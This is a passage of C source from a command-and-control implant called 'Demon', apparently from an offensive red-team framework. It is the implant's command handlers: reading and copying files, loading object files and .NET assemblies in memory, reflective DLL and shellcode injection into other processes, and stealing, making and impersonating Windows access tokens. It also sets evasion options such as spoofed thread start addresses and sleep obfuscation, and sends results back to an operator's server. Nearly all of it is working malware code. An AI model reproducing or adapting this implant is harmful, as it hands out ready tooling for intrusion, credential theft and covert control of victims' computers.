        case DEMON_COMMAND_FS_COPY: PUTS( "FS::Copy" )
        {
            UINT32 FromSize = 0;
            UINT32 ToSize   = 0;
            LPWSTR PathFrom = NULL;
            LPWSTR PathTo   = NULL;
            BOOL   Success  = FALSE;

            PathFrom = ParserGetWString( Parser, &FromSize );
            PathTo   = ParserGetWString( Parser, &ToSize );

            PRINTF( "Copy file %s to %s\n", PathFrom, PathTo )

            Success = Instance.Win32.CopyFileW( PathFrom, PathTo, FALSE );
            if ( ! Success )
                CALLBACK_GETLASTERROR

            PackageAddInt32( Package, Success );
            PackageAddWString( Package, PathFrom );
            PackageAddWString( Package, PathTo );

            break;
        }

        case DEMON_COMMAND_FS_GET_PWD: PUTS( "FS::GetPwd" )
        {
            WCHAR Path[ MAX_PATH * 2 ] = { 0 };
            DWORD Return               = 0;

            if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) )
            {
                PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }
            else
                PackageAddWString( Package, Path );

            break;
        }

        case DEMON_COMMAND_FS_CAT: PUTS( "FS::Cat" )
        {
            DWORD  FileSize = 0;
            UINT32 NameSize = 0;
            LPWSTR FileName = ParserGetWString( Parser, &NameSize );
            PVOID  Content  = NULL;
            BOOL   Success  = FALSE;

            PRINTF( "FileName => %ls\n", FileName )

            Success = ReadLocalFile( FileName, &Content, &FileSize );

            PackageAddWString( Package, FileName );
            PackageAddInt32( Package, Success );
            PackageAddBytes( Package, Content,  FileSize );

            if ( Content )
            {
                MemSet( Content, 0, FileSize );
                Instance.Win32.LocalFree( Content );
                Content = NULL;
            }
            break;
        }

        default:
        {
            PRINTF( "FS SubCommand not found: %d : %x\n", Command, Command );
            break;
        }
    }

    PUTS( "Transmit package" )
    PackageTransmit( Package, NULL, NULL );

LEAVE:
    PUTS( "PackageDestroy" )
    PackageDestroy( Package );
}

VOID CommandInlineExecute( PPARSER Parser )
{
    UINT32    FunctionNameSize = 0;
    DWORD     ObjectDataSize   = 0;
    UINT32    ArgSize          = 0;
    PCHAR     ObjectData       = NULL;
    PMEM_FILE MemFile          = NULL;
    PCHAR     FunctionName     = ParserGetString( Parser, &FunctionNameSize );
    ULONG     MemFileID        = ParserGetInt32( Parser );
    PCHAR     ArgBuffer        = ParserGetString( Parser, &ArgSize );
    INT32     Flags            = ParserGetInt32( Parser );

    MemFile = GetMemFile( MemFileID );
    if ( MemFile && MemFile->IsCompleted )
    {
        ObjectData     = MemFile->Data;
        ObjectDataSize = MemFile->Size;
    }
    else if ( MemFile && ! MemFile->IsCompleted )
    {
        PRINTF( "MemFile [%x] was not completed\n", MemFileID );
    }
    else
    {
        PRINTF( "MemFile [%x] not found\n", MemFileID );
    }

    switch ( Flags )
    {
        case 0:
        {
            PUTS( "Use Non-Threaded CoffeeLdr" )
            CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
            break;
        }

        case 1:
        {
            PUTS( "Use Threaded CoffeeRunner" )
            CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
            break;
        }

        default:
        {
            PUTS( "Use default (from config) CoffeeLdr" )

            if ( Instance.Config.Implant.CoffeeThreaded )
            {
                PUTS( "Config is set to threaded" )
                CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
            }
            else
            {
                PUTS( "Config is set to non-threaded" )
                CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
            }

            break;
        }
    }

    RemoveMemFile( MemFileID );
}

VOID CommandInjectDLL( PPARSER Parser )
{
    PPACKAGE          Package    = PackageCreate( DEMON_COMMAND_INJECT_DLL );

    UINT32            DllSize    = 0;
    DWORD             Result     = 1;
    NTSTATUS          NtStatus   = STATUS_SUCCESS;
    PBYTE             DllBytes   = NULL;
    UINT32            DllLdrSize = 0;
    PBYTE             DllLdr     = NULL;
    HANDLE            hProcess   = NULL;
    CLIENT_ID         ProcID     = { 0 };
    OBJECT_ATTRIBUTES ObjAttr    = { sizeof( ObjAttr ) };
    INJECTION_CTX     InjCtx     = { 0 };

    InjCtx.Technique = ParserGetInt32( Parser );
    InjCtx.ProcessID = ParserGetInt32( Parser );
    DllLdr           = ParserGetBytes( Parser, &DllLdrSize );
    DllBytes         = ParserGetBytes( Parser, &DllSize );
    InjCtx.Parameter = ParserGetBytes( Parser, &InjCtx.ParameterSize );

    PRINTF( "Technique: %d\n", InjCtx.Technique )
    PRINTF( "ProcessID: %d\n", InjCtx.ProcessID )
    PRINTF( "DllBytes : %x [%d]\n", DllBytes, DllSize );
    PRINTF( "Parameter: %x [%d]\n", InjCtx.Parameter, InjCtx.ParameterSize );

    ProcID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) InjCtx.ProcessID;

    if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID ) ) )
    {
        Result = DllInjectReflective( hProcess, DllLdr, DllLdrSize, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
    }
    else
    {
        PUTS( "[-] NtOpenProcess: Failed to open process" )
        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
    }

    PRINTF( "Injected Result: %d\n", Result )

    PackageAddInt32( Package, Result );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandSpawnDLL( PPARSER Parser )
{
    PPACKAGE      Package    = NULL;
    INJECTION_CTX InjCtx     = { 0 };
    UINT32        DllSize    = 0;
    UINT32        ArgSize    = 0;
    UINT32        DllLdrSize = 0;
    PCHAR         DllLdr     = ParserGetString( Parser, &DllLdrSize );
    PCHAR         DllBytes   = ParserGetString( Parser, &DllSize );
    PCHAR         Arguments  = ParserGetString( Parser, &ArgSize );
    DWORD         Result     = 0;

    Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
    Result  = DllSpawnReflective( DllLdr, DllLdrSize, DllBytes, DllSize, Arguments, ArgSize, &InjCtx );

    PackageAddInt32( Package, Result );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandInjectShellcode( PPARSER Parser )
{
    PPACKAGE      Package        = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
    UINT32        ShellcodeSize  = 0;
    UINT32        ArgumentSize   = 0;

    BOOL          Inject         = ( BOOL )  ParserGetInt32( Parser );
    SHORT         Technique      = ( SHORT ) ParserGetInt32( Parser );
    SHORT         TargetArch     = ( SHORT ) ParserGetInt32( Parser );
    PVOID         ShellcodeBytes = ParserGetBytes( Parser, &ShellcodeSize );
    PVOID         ShellcodeArgs  = ParserGetBytes( Parser, &ArgumentSize );
    DWORD         TargetPID      = ParserGetInt32( Parser );

    DWORD         Result         = ERROR_SUCCESS;
    INJECTION_CTX InjectionCtx   = {
            .ProcessID      = TargetPID,
            .hThread        = NULL,
            .Arch           = TargetArch,
            .Parameter      = ShellcodeArgs,
            .ParameterSize  = ArgumentSize,
    };

    PRINTF( "Inject[%s] Technique[%d] TargetPID:[%d] TargetProcessArch:[%d] ShellcodeSize:[%d]\n", Inject ? "TRUE" : "FALSE", Technique, TargetPID, TargetArch, ShellcodeSize );

    if ( Inject == 1 )
    {
        // Inject into running process
        CLIENT_ID         ClientID = { TargetPID, 0 };
        NTSTATUS          NtStatus = 0;
        OBJECT_ATTRIBUTES ObjAttr  = { sizeof( ObjAttr ) };

        NtStatus = Instance.Syscall.NtOpenProcess( &InjectionCtx.hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID );

        if ( ! NT_SUCCESS( NtStatus ) )
        {
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            return;
        }
    }
    else if ( Inject == 2 )
    {
        // Execute
        InjectionCtx.hProcess = NtCurrentProcess();
    }

    Technique = Technique == 0 ? Instance.Config.Inject.Technique : Technique; // if the teamserver specified 0 ==> means that it should use the technique from the config

    PRINTF( "Technique going to be used => %d\n", Technique )

    Result = ShellcodeInjectDispatch(
        Inject,
        Technique,
        ShellcodeBytes,
        ShellcodeSize,
        &InjectionCtx
    );

    PRINTF( "Injection Result => %d", Result )

    PackageAddInt32( Package, Result );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandToken( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_TOKEN );
    DWORD    Command = ParserGetInt32( Parser );

    PRINTF( "Command => %d\n", Command )

    PackageAddInt32( Package, Command );
    switch ( Command )
    {
        case DEMON_COMMAND_TOKEN_IMPERSONATE: PUTS( "Token::Impersonate" )
        {
            DWORD            dwTokenID = ParserGetInt32( Parser );
            PTOKEN_LIST_DATA TokenData = NULL;

            TokenData = TokenGet( dwTokenID );

            if ( TokenData )
            {
                PackageAddInt32( Package, ImpersonateTokenInStore( TokenData ) );
                PackageAddString( Package, TokenData->DomainUser );
            }
            else
            {
                PUTS( "Token not found in vault." )
                PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
                PackageAddInt32( Package, FALSE );
                PackageAddInt32( Package, 0 );
            }

            break;
        }

        case DEMON_COMMAND_TOKEN_STEAL: PUTS( "Token::Steal" )
        {
            DWORD  TargetPid    = ParserGetInt32( Parser );
            HANDLE TargetHandle = ( HANDLE ) ( ULONG_PTR ) ParserGetInt32( Parser );
            HANDLE StolenToken  = TokenSteal( TargetPid, TargetHandle );
            UINT32 UserSize     = 0;
            PCHAR  User         = NULL;
            DWORD  NewTokenID   = 0;

            if ( ! StolenToken )
            {
                PUTS( "[!] Couldn't get remote process token" )
                return;
            }

            User       = TokenGetUserDomain( StolenToken, &UserSize );
            NewTokenID = TokenAdd( StolenToken, User, TOKEN_TYPE_STOLEN, TargetPid, NULL, NULL, NULL );

            // when a new token is stolen, we impersonate it automatically
            ImpersonateTokenFromVault( NewTokenID );

            PRINTF( "[^] New Token added to the Vault: %d User:[%s]\n", NewTokenID, User );

            PackageAddString( Package, User );
            PackageAddInt32( Package, NewTokenID );
            PackageAddInt32( Package, TargetPid );

            break;
        }

        case DEMON_COMMAND_TOKEN_LIST: PUTS( "Token::List" )
        {
            PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
            DWORD            TokenIndex = 0;

            do {
                if ( TokenList != NULL )
                {
                    PRINTF( "[TOKEN_LIST] Index:[%d] Handle:[0x%x] User:[%s] Pid:[%d]\n", TokenIndex, TokenList->Handle, TokenList->DomainUser, TokenList->dwProcessID );

                    PackageAddInt32( Package, TokenIndex );
                    PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList->Handle );
                    PackageAddString( Package, TokenList->DomainUser );
                    PackageAddInt32( Package, TokenList->dwProcessID );
                    PackageAddInt32( Package, TokenList->Type );
                    PackageAddInt32( Package, Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenList->Handle );

                    TokenList = TokenList->NextToken;
                }
                else
                    break;

                TokenIndex++;
            } while ( TRUE );
            break;
        }

        case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST: PUTS( "Token::PrivsGetOrList" )
        {
            PTOKEN_PRIVILEGES TokenPrivs     = NULL;
            DWORD             TPSize         = 0;
            DWORD             Length         = 0;
            HANDLE            TokenHandle    = NULL;
            PCHAR             PrivName       = NULL;
            UINT32            PrivNameLength = 0;
            BOOL              ListPrivs      = ParserGetInt32( Parser );

            PackageAddInt32( Package, ListPrivs );

            if ( ListPrivs )
            {
                PUTS( "Privs::List" )
                TokenHandle = TokenCurrentHandle();

                Instance.Win32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, 0, &TPSize );
                TokenPrivs = Instance.Win32.LocalAlloc( LPTR, ( TPSize + 1 ) * sizeof( TOKEN_PRIVILEGES ) );

                CHAR Name[ MAX_PATH ] = { 0 };

                if ( TokenPrivs )
                {
                    if ( Instance.Win32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, TPSize, &TPSize ) )
                    {
                        for ( INT i = 0; i < TokenPrivs->PrivilegeCount; i++ )
                        {
                            Length = MAX_PATH;
                            Instance.Win32.LookupPrivilegeNameA( NULL, &TokenPrivs->Privileges[ i ].Luid, Name, &Length );
                            PackageAddString( Package, Name );
                            PackageAddInt32( Package, TokenPrivs->Privileges[ i ].Attributes );
                        }
                    }
                }
            }
            else
            {
                PUTS( "Privs::Get" )
                PrivName = ParserGetString( Parser, &PrivNameLength );

                PackageAddInt32( Package, TokenSetPrivilege( PrivName, TRUE ) );
                PackageAddString( Package, PrivName );
            }

            if ( TokenPrivs )
            {
                MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
                Instance.Win32.LocalFree( TokenPrivs );
                TokenPrivs = NULL;
            }

            break;
        }

        case DEMON_COMMAND_TOKEN_MAKE: PUTS( "Token::Make" )
        {
            UINT32 dwUserSize     = 0;
            UINT32 dwPasswordSize = 0;
            UINT32 dwDomainSize   = 0;
            PWCHAR lpDomain       = ParserGetWString( Parser, &dwDomainSize );
            PWCHAR lpUser         = ParserGetWString( Parser, &dwUserSize );
            PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
            CHAR   Deli[ 2 ]      = { '\\', 0 };
            HANDLE hToken         = NULL;
            PCHAR  UserDomain     = NULL;
            LPSTR  BufferUser     = NULL;
            LPSTR  BufferPassword = NULL;
            LPSTR  BufferDomain   = NULL;
            DWORD  UserDomainSize = dwUserSize + dwDomainSize + 1;
            DWORD  NewTokenID     = 0;

            if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
            {
                PRINTF( "Create new token: Domain:[%ls] User:[%ls] Password:[%ls]\n", lpDomain, lpUser, lpPassword )

                hToken = TokenMake( lpUser, lpPassword, lpDomain );
                if ( hToken != NULL )
                {
                    UserDomain = Instance.Win32.LocalAlloc( LPTR, UserDomainSize );

                    MemSet( UserDomain, 0, UserDomainSize );

                    StringConcatW( UserDomain, lpDomain );
                    StringConcatW( UserDomain, Deli );
                    StringConcatW( UserDomain, lpUser );

                    BufferUser     = Instance.Win32.LocalAlloc( LPTR, dwUserSize );
                    BufferPassword = Instance.Win32.LocalAlloc( LPTR, dwPasswordSize );
                    BufferDomain   = Instance.Win32.LocalAlloc( LPTR, dwDomainSize );

                    MemCopy( BufferUser, lpUser, dwUserSize );
                    MemCopy( BufferPassword, lpPassword, dwPasswordSize );
                    MemCopy( BufferDomain, lpDomain, dwDomainSize );

                    NewTokenID = TokenAdd(
                        hToken,
                        UserDomain,
                        TOKEN_TYPE_MAKE_NETWORK,
                        ( DWORD ) ( ULONG_PTR ) NtCurrentTeb()->ClientId.UniqueProcess,
                        BufferUser,
                        BufferDomain,
                        BufferPassword
                    );

                    // when a new token is created, we impersonate it automatically
                    ImpersonateTokenFromVault( NewTokenID );

                    PRINTF( "UserDomain => %ls\n", UserDomain )

                    PackageAddWString( Package, UserDomain );
                }
            }

            break;
        }

        case DEMON_COMMAND_TOKEN_GET_UID: PUTS( "Token::GetUID" )
        {
            DWORD           cbSize     = sizeof( TOKEN_ELEVATION );
            TOKEN_ELEVATION Elevation  = { 0 };
            HANDLE          hToken     = TokenCurrentHandle( );
            NTSTATUS        NtStatus   = STATUS_SUCCESS;
            UINT32          UserSize = 0;
            PCHAR           User       = NULL;

            PRINTF( "[x] hToken: 0x%x\n", hToken );

            if ( ! hToken )
                return;

            if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQueryInformationToken( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) )
            {
                PUTS( "NtQueryInformationToken: Failed" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                return;
            }
            PUTS( "NtQueryInformationToken: Success" )

            User = TokenGetUserDomain( hToken, &UserSize );

            PackageAddInt32( Package, Elevation.TokenIsElevated );
            PackageAddString( Package, User );

            Instance.Win32.NtClose( hToken );

            if ( User )
            {
                DATA_FREE( User, UserSize )
            }

            break;
        }

        case DEMON_COMMAND_TOKEN_REVERT: PUTS( "Token::Revert" )
        {
            BOOL Success = Instance.Win32.RevertToSelf();

            PackageAddInt32( Package, Success );

            if ( ! Success )
                CALLBACK_GETLASTERROR;

            Instance.Tokens.Token       = NULL;
            Instance.Tokens.Impersonate = FALSE;

            break;
        }

        case DEMON_COMMAND_TOKEN_REMOVE: PUTS( "Token::Remove" )
        {
            DWORD TokenID = ParserGetInt32( Parser );

            PackageAddInt32( Package, TokenRemove( TokenID ) );
            PackageAddInt32( Package, TokenID );

            break;
        }

        case DEMON_COMMAND_TOKEN_CLEAR: PUTS( "Token::Clear" )
        {

            TokenClear();

            break;
        }

        case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::FindTokens" )
        {
            PUniqueUserToken TokenList    = NULL;
            DWORD            NumTokens    = 0;
            BOOL             Success      = FALSE;
            DWORD            NumDelTokens = 0;
            DWORD            NumImpTokens = 0;
            DWORD            i            = 0 ;

            Success = ListTokens( &TokenList, &NumTokens );

            PackageAddInt32( Package, Success );

            if ( Success )
            {
                // TODO: this can surely be more efficient

                for (i = 0; i < NumTokens; ++i)
                {
                    if ( TokenList[ i ].delegation_available )
                        NumDelTokens++;
                    if ( TokenList[ i ].impersonation_available )
                        NumImpTokens++;
                }

                PackageAddInt32( Package, NumDelTokens );

                for (i = 0; i < NumTokens; ++i)
                {
                    if (TokenList[ i ].delegation_available)
                    {
                        PackageAddString( Package, TokenList[ i ].username );
                        PackageAddInt32( Package, TokenList[ i ].dwProcessID );
                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
                    }
                }

                PackageAddInt32( Package, NumImpTokens );

                for (i = 0; i < NumTokens; ++i)
                {
                    if (TokenList[ i ].impersonation_available)
                    {
                        PackageAddString( Package, TokenList[ i ].username );
                        PackageAddInt32( Package, TokenList[ i ].dwProcessID );
                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
                    }
                }
            }

            if ( TokenList )
            {
                DATA_FREE( TokenList, NumTokens * sizeof( UniqueUserToken ) );
            }

            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandAssemblyInlineExecute( PPARSER Parser )
{
    if ( ! Instance.Dotnet )
    {
        BUFFER Buffer       = { 0 };
        BUFFER AssemblyData = { 0 };
        BUFFER AssemblyArgs = { 0 };

        Instance.Dotnet            = NtHeapAlloc( sizeof( DOTNET_ARGS ) );
        Instance.Dotnet->RequestID = Instance.CurrentRequestID;
        Instance.Dotnet->Invoked   = FALSE;

        /* Parse Pipe Name */
        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
        Instance.Dotnet->PipeName.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        Instance.Dotnet->PipeName.Length = Buffer.Length;
        MemCopy( Instance.Dotnet->PipeName.Buffer, Buffer.Buffer, Instance.Dotnet->PipeName.Length );

        /* Parse AppDomain Name */
        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
        Instance.Dotnet->AppDomainName.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        Instance.Dotnet->AppDomainName.Length = Buffer.Length;
        MemCopy( Instance.Dotnet->AppDomainName.Buffer, Buffer.Buffer, Instance.Dotnet->AppDomainName.Length );

        /* Parse Net Version */
        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
        Instance.Dotnet->NetVersion.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        Instance.Dotnet->NetVersion.Length = Buffer.Length;
        MemCopy( Instance.Dotnet->NetVersion.Buffer, Buffer.Buffer, Instance.Dotnet->NetVersion.Length );

        /* Parse Assembly MemFile */
        ULONG32 MemFileID = ParserGetInt32( Parser );
        PMEM_FILE MemFile = GetMemFile( MemFileID );
        AssemblyData.Buffer = NULL;
        AssemblyData.Length = 0;

        if ( MemFile && MemFile->IsCompleted )
        {
            AssemblyData.Buffer = MemFile->Data;
            AssemblyData.Length = MemFile->Size;
        }
        else if ( MemFile && ! MemFile->IsCompleted )
        {
            PRINTF( "MemFile [%x] was not completed\n", MemFileID );
        }
        else
        {
            PRINTF( "MemFile [%x] not found\n", MemFileID );
        }

        /* Parse Argument */
        AssemblyArgs.Buffer = ParserGetWString( Parser, &Buffer.Length );

        PRINTF(
            "Parsed Arguments:         \n"
            " - PipeName     [%d]: %ls \n"
            " - AppDomain    [%d]: %ls \n"
            " - NetString    [%d]: %ls \n"
            " - AssemblyArgs [%d]: %ls \n"
            " - AssemblyData [%d]: %p  \n",
            Instance.Dotnet->PipeName.Length,      Instance.Dotnet->PipeName.Buffer,
            Instance.Dotnet->AppDomainName.Length, Instance.Dotnet->AppDomainName.Buffer,
            Instance.Dotnet->NetVersion.Length,    Instance.Dotnet->NetVersion.Buffer,
            AssemblyArgs.Length,                   AssemblyArgs.Buffer,
            AssemblyData.Length,                   AssemblyData.Buffer
        )

        if ( ! DotnetExecute( AssemblyData, AssemblyArgs ) )
        {
            PPACKAGE Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
            PackageAddInt32( Package, DOTNET_INFO_FAILED );
            PackageTransmit( Package, NULL, NULL );

            DotnetClose();
        }

        PUTS( "Finished with Assembly inline execute" )
    }
    else
    {
        PUTS( "Dotnet instance already running." )
    }
}

VOID CommandAssemblyListVersion( PPARSER Parser )
{
    PPACKAGE         Package      = PackageCreate( DEMON_COMMAND_ASSEMBLY_VERSIONS );
    PICLRMetaHost    pClrMetaHost = { NULL };
    PIEnumUnknown    pEnumClr     = { NULL };
    PICLRRuntimeInfo pRunTimeInfo = { NULL };

    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)&pClrMetaHost ) == S_OK )
    {
        if ( ( pClrMetaHost )->lpVtbl->EnumerateInstalledRuntimes( pClrMetaHost, &pEnumClr ) == S_OK )
        {
            DWORD dwStringSize = 0;
            while ( TRUE )
            {
                IUnknown *UPTR      = { 0 };
                ULONG    fetched    = 0;

                if ( pEnumClr->lpVtbl->Next( pEnumClr, 1, &UPTR, &fetched ) == S_OK )
                {
                    pRunTimeInfo = ( PICLRRuntimeInfo ) UPTR;
                    if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, NULL, &dwStringSize ) == HRESULT_FROM_WIN32( ERROR_INSUFFICIENT_BUFFER ) && dwStringSize > 0 )
                    {
                        LPVOID Version = Instance.Win32.LocalAlloc( LPTR, dwStringSize );

                        if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, Version, &dwStringSize ) == S_OK )
                        {
                            PRINTF( "Version[ %d ]: %ls\n", dwStringSize, Version );
                            PackageAddWString( Package, Version );
                        }

                        Instance.Win32.LocalFree( Version );
                        Version = NULL;
                        dwStringSize = 0;
                    }
                    else
                        PUTS("Failed get Version String")
                }
                else break;
            }
        }
        else
            PUTS("Failed to enumerate")
    }
    else
        PUTS("Failed to CLRCreateInstance");

    if ( pClrMetaHost )
    {
        pClrMetaHost->lpVtbl->Release( pClrMetaHost );
        pClrMetaHost = NULL;
    }

    if ( pEnumClr )
    {
        pEnumClr->lpVtbl->Release( pEnumClr );
        pEnumClr = NULL;
    }

    if ( pRunTimeInfo )
    {
        pRunTimeInfo->lpVtbl->Release( pRunTimeInfo );
        pRunTimeInfo = NULL;
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandConfig( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_CONFIG );
    UINT32   Config  = ParserGetInt32( Parser );

    PackageAddInt32( Package, Config );

    switch ( Config )
    {
        case DEMON_CONFIG_SHOW_ALL:
        {
            break;
        }

        case DEMON_CONFIG_IMPLANT_SPFTHREADADDR:
        {
            UINT32  LibSize    = 0;
            UINT32  FuncSize   = 0;
            PCHAR   Library    = ParserGetString( Parser, &LibSize );
            PCHAR   Function   = ParserGetString( Parser, &FuncSize );
            UINT32  Offset     = ParserGetInt32( Parser );
            PVOID   ThreadAddr = NULL;

            PRINTF( "Library  => %s\n", Library );
            PRINTF( "Function => %s\n", Function );
            PRINTF( "Offset => %x\n", Offset );

            if ( Library )
            {
                PVOID hLib = NULL;

                // TODO: check in the current PEB too
                hLib = LdrModuleLoad( Library );
                PRINTF( "hLib => %x\n", hLib );

                if ( hLib )
                {
                    ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );
                    if ( ThreadAddr )
                        Instance.Config.Implant.ThreadStartAddr = ThreadAddr + Offset;
                    else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );

                    PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                }
                else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
            }

            PackageAddString( Package, Library );
            PackageAddString( Package, Function );

            break;
        }

        case DEMON_CONFIG_IMPLANT_SLEEP_TECHNIQUE:
        {
            Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( Parser );
            PRINTF( "Set sleep obfuscation technique to %d\n", Instance.Config.Implant.SleepMaskTechnique )
            PackageAddInt32( Package, Instance.Config.Implant.SleepMaskTechnique );
            break;
        }

        case DEMON_CONFIG_IMPLANT_VERBOSE:
        {
            Instance.Config.Implant.Verbose = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Implant.Verbose );
            break;
        }

        case DEMON_CONFIG_IMPLANT_COFFEE_VEH:
        {
            Instance.Config.Implant.CoffeeVeh = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Implant.CoffeeVeh );
            break;
        }

        case DEMON_CONFIG_IMPLANT_COFFEE_THREADED:
        {
            Instance.Config.Implant.CoffeeThreaded = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Implant.CoffeeThreaded );
            break;
        }

        case DEMON_CONFIG_MEMORY_ALLOC:
        {
            Instance.Config.Memory.Alloc = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Memory.Alloc );
            break;
        }

        case DEMON_CONFIG_MEMORY_EXECUTE:
        {
            Instance.Config.Memory.Execute = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Memory.Execute );
            break;
        }

        case DEMON_CONFIG_INJECTION_TECHNIQUE:
        {
            Instance.Config.Inject.Technique = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Inject.Technique );
            break;
        }

        case DEMON_CONFIG_INJECTION_SPOOFADDR:
        {
            UINT32  LibSize    = 0;
            UINT32  FuncSize   = 0;
            PCHAR   Library    = ParserGetString( Parser, &LibSize );
            PCHAR   Function   = ParserGetString( Parser, &FuncSize );
            UINT32  Offset     = ParserGetInt32( Parser );
            PVOID   ThreadAddr = NULL;

            PRINTF( "Library  => %s\n", Library );
            PRINTF( "Function => %s\n", Function );
            PRINTF( "Offset => %x\n", Offset );

            if ( Library )
            {
                PVOID hLib = NULL;

                // TODO: check in the current PEB too
                hLib = LdrModuleLoad( Library );
                PRINTF( "hLib => %x\n", hLib );

                if ( hLib )
                {
                    ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );

                    if ( ThreadAddr )
                        Instance.Config.Inject.SpoofAddr = ThreadAddr + Offset;

                    else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );

                    PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                }
                else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
            }

            PackageAddString( Package, Library );
            PackageAddString( Package, Function );

            break;
        }

        case DEMON_CONFIG_INJECTION_SPAWN64:
        {
            UINT32 Size   = 0;
            PVOID  Buffer = NULL;

            if ( Instance.Config.Process.Spawn64 )
            {
                MemSet( Instance.Config.Process.Spawn64, 0, StringLengthW( Instance.Config.Process.Spawn64 ) * sizeof( WCHAR ) );
                Instance.Win32.LocalFree( Instance.Config.Process.Spawn64 );
                Instance.Config.Process.Spawn64 = NULL;
            }

            Buffer = ParserGetBytes( Parser, &Size );
            Instance.Config.Process.Spawn64 = Instance.Win32.LocalAlloc( LPTR, Size );
            MemCopy( Instance.Config.Process.Spawn64, Buffer, Size );

            PRINTF( "Instance.Config.Process.Spawn64 => %ls\n", Instance.Config.Process.Spawn64 );
            PackageAddWString( Package, Instance.Config.Process.Spawn64 );

            break;
        }

        case DEMON_CONFIG_INJECTION_SPAWN32:
        {
            UINT32 Size   = 0;
            PVOID  Buffer = NULL;

            if ( Instance.Config.Process.Spawn86 )
            {
                MemSet( Instance.Config.Process.Spawn86, 0, StringLengthW( Instance.Config.Process.Spawn86 ) * sizeof( WCHAR ) );
                Instance.Win32.LocalFree( Instance.Config.Process.Spawn86 );
                Instance.Config.Process.Spawn86 = NULL;
            }

            Buffer = ParserGetBytes( Parser, &Size );
            Instance.Config.Process.Spawn86 = Instance.Win32.LocalAlloc( LPTR, Size );
            MemCopy( Instance.Config.Process.Spawn86, Buffer, Size );

            PRINTF( "Instance.Config.Process.Spawn86 => %ls\n", Instance.Config.Process.Spawn86 );
            PackageAddWString( Package, Instance.Config.Process.Spawn86 );

            break;
        }

        case DEMON_CONFIG_KILLDATE:
        {
            Instance.Config.Transport.KillDate = ParserGetInt64( Parser );

            PRINTF( "Instance.Config.Transport.KillDate => %d\n", Instance.Config.Transport.KillDate );
            PackageAddInt64( Package, Instance.Config.Transport.KillDate );

            break;
        }

        case DEMON_CONFIG_WORKINGHOURS:
        {
